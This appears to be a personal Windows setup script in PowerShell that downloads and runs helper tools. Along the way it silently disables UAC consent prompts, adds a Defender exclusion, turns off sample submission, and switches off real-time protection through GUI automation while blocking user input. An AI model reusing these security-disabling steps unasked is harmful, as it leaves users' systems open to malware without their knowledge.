$ErrorActionPreference = "Stop"

$x, $y = [Console]::CursorLeft, [Console]::CursorTop
Write-Host "`n### 준비중" -ForegroundColor Green -NoNewline

$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$Git = "https://raw.githubusercontent.com/ssokka/Windows/master"

$sb = { 'ConsentPromptBehaviorAdmin', 'PromptOnSecureDesktop' | ForEach-Object { reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' /v $_ /t REG_DWORD /d '0' /f } }
Start-Process -Verb RunAs -Wait -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-command", "(Invoke-Command -ScriptBlock {$sb})"

$Temp = "$Env:Temp\Download"
New-Item -Path $Temp -ItemType Directory -Force | Out-Null

Start-Process -Verb RunAs -Wait -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-command", "
Add-MpPreference -ExclusionPath `"$Temp`" -Force
Set-MpPreference -MAPSReporting 0 -Force
Set-MpPreference -SubmitSamplesConsent 2 -Force
"

$UserInput = Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);' -Name UserInput -Namespace UserInput -PassThru

function current-cursor-position {
	[Alias("ccp")]
	param([Int]$x, [Int]$y)
	if ($Env:WT_SESSION -or $Env:OS -ne "Windows_NT") {
		if (!$LastConsoleLine -and [Console]::CursorTop -eq [Console]::WindowHeight - 1) { $LastConsoleLine = 1; --$y }
	}
	[Console]::SetCursorPosition($x, $y)
	[Console]::Write("{0,-$([Console]::WindowWidth)}" -f " ")
	[Console]::SetCursorPosition($x, $y)
}

function download {
	[Alias("dw")]
	param(
		[string]$url,
		[string]$dst = $Temp,
		[string]$pat = '*x64.zip'
	)
	if ($url -match '^https://api.github.com/repos/.*/releases/latest$') {
		$src = (Invoke-RestMethod -Uri $url | ForEach-Object assets | Where-Object name -like $pat).browser_download_url
		$file = $src -replace '.*/(.*)', '$1'
	} else {
		$wr = [Net.WebRequest]::Create($url)
		$wr.AllowAutoRedirect = $true
		$wr.Method = "HEAD"
		$re = $wr.GetResponse()
		$src = $re.ResponseUri
		$file = [IO.Path]::GetFileName($src.AbsolutePath)
		$re.Close()
	}
	if ($dst.EndsWith('\')) {
		$dst += $file
	} else {
		$dst += '\' + $file
	}
	Start-BitsTransfer -Source $src -Destination $dst
	if (Test-Path -Path $dst) { return $dst }
}

function disable-defender-realtime {
	[Alias("ddr")]
	param([bool]$status = $true)
	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
		do {
			explorer windowsdefender://ThreatSettings
			do {
				Start-Sleep -Milliseconds 1500
				$wid = (Get-Process | Where-Object {$_.MainWindowTitle -like "Windows 보안" -and $_.ProcessName -eq "ApplicationFrameHost"}).Id
			} until ($wid)
			Start-Sleep -Milliseconds 1500
			$shell = New-Object -ComObject WScript.Shell
			$UserInput::BlockInput($true) | Out-Null
			$shell.AppActivate($wid) | Out-Null
			$shell.SendKeys(' ')
			$UserInput::BlockInput($false) | Out-Null
			Start-Sleep -Milliseconds 1500
		} until ((Get-MpComputerStatus).RealTimeProtectionEnabled -eq $status)
		Stop-Process -Id $wid -ErrorAction Ignore
	}
}

function get-online-version {
	[Alias("gov")]
	param(
		[string]$url,
		[string]$pat = '',
		[string]$ret = ''
	)
	if ($url -match '^https://api.github.com/repos/.*/releases/latest$') {
		$ver = (Invoke-RestMethod -Uri $url).tag_name
	} else {
		$wc = New-Object System.Net.WebClient
		$wc.Headers["User-Agent"] = $UserAgent
		$ver = $wc.DownloadString($url)
	}
	if ($pat) { $ver = $ver -replace $pat, $ret }
	if ($ver) { return $ver.Trim() }
}

function install-7zip {
	$mod = "7Zip4Powershell"
	if (!(Get-Module -Name $mod -ListAvailable)) {
		Start-Process -Verb RunAs -Wait -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-command", "
		Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
		Install-PackageProvider NuGet -MinimumVersion 2.8.5.201 -Force
		Register-PSRepository -Default -ErrorAction Ignore
		Set-PSRepository PSGallery -InstallationPolicy Trusted
		Install-Module $mod -Force
		"
	}
}

function pin-to {
	[Alias('pt')]
	param(
		[string]$type,
		[string]$name,
		[string]$path,
		[string]$argu = $null,
		[string]$icon = $null,
		[bool]$kill = $false
	)
	$ErrorActionPreference = "Stop"
	switch ($type) {
		task { $type, $pdir = "5386", "$Env:AppData\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" }
		start { $type, $pdir = "51201", "$Env:AppData\Microsoft\Windows\Start Menu\Programs" }
	}
	if (!$icon) { $icon = $path }
	$exec = "syspin.exe"
	$down = "https://www.technosys.net/download.aspx?file=$exec"
	$guid = ([System.Guid]::NewGuid()).ToString()
	$gexe = "$Temp\$guid.exe"
	$glnk = "$pdir\$guid.lnk"
	$nlnk = "$pdir\$name.lnk"
	Write-Host $name
	if (!(Test-Path -Path "$Temp\$exec")) { Start-BitsTransfer -Source $down -Destination "$Temp\$exec" }
	New-Item -Path $gexe -ItemType File -Force | Out-Null
	& "$Temp\$exec" "$gexe" $type | Out-Null | Out-Host
	do { Start-Sleep -Milliseconds 250 } until (Test-Path -Path $glnk)
	Start-Sleep -Seconds 5
	$shell = (New-Object -ComObject WScript.Shell).CreateShortcut($glnk)
	$shell.TargetPath = $path
	$shell.Arguments = $argu
	$shell.IconLocation = $icon
	$shell.Save()
	$gexe, $nlnk | ForEach-Object { Remove-Item -Path $_ -Force -ErrorAction Ignore }
	Rename-Item -Path $glnk -NewName $nlnk -Force
	Start-Sleep -Seconds 1
	if ($kill) { Start-Sleep -Seconds 3; Stop-Process -Name explorer -Force }
}

function set-window {
	param([int]$cpid = $PID)
	$ErrorActionPreference = "SilentlyContinue"
	$exec = "nircmd.exe"
	$down = "https://www.nirsoft.net/utils/nircmd.zip"
	$file = "nircmd.zip"
	if (!(Test-Path -Path "$Temp\$exec")) {
		Start-BitsTransfer -Source "$down" -Destination "$Temp\$file"
		Expand-Archive -Path "$Temp\$file" -DestinationPath "$Temp" -Force
	}
	$ppid = (Get-WmiObject Win32_Process -Filter "processid='$cpid'").ParentProcessId
	$hwnd = (Get-Process -Id $ppid).MainWindowHandle
	if (!$hwnd) { $hwnd = (Get-Process -Id $cpid).MainWindowHandle }
	if (Test-Path -Path "$Temp\$exec") {
		$sb = { param($exec, $hwnd); 'normal', 'activate', 'center' | ForEach-Object { & $exec win $_ handle $hwnd } }
		Start-Process -Verb RunAs -Wait -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-command (Invoke-Command -ScriptBlock {$sb} -ArgumentList `"$Temp\$exec`", $hwnd)"
	}
}

set-window
ccp $x $y
